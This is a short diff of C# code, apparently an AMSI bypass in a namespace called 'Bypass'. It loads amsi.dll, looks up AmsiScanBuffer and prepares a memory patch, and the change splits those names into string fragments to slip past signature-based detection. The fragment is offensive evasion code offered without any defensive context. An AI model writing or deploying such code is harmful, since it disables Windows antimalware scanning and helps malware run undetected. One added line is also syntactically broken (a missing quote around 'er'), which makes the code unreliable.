@@ -20,9 +20,9 @@ namespace Bypass
         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
         public static int Disable()
         {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
+            IntPtr TargetDLL = LoadLibrary("a"+"m"+"si.dll");
             if (TargetDLL == IntPtr.Zero) { return 1; }
-            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
+            IntPtr ASBPtr = GetProcAddress(TargetDLL, "A"+"msi" + "S"+"c"+"an" + "Bu"+"ff"+er");
             if (ASBPtr == IntPtr.Zero) { return 1; }
             UIntPtr dwSize = (UIntPtr)5;
             uint Zero = 0;
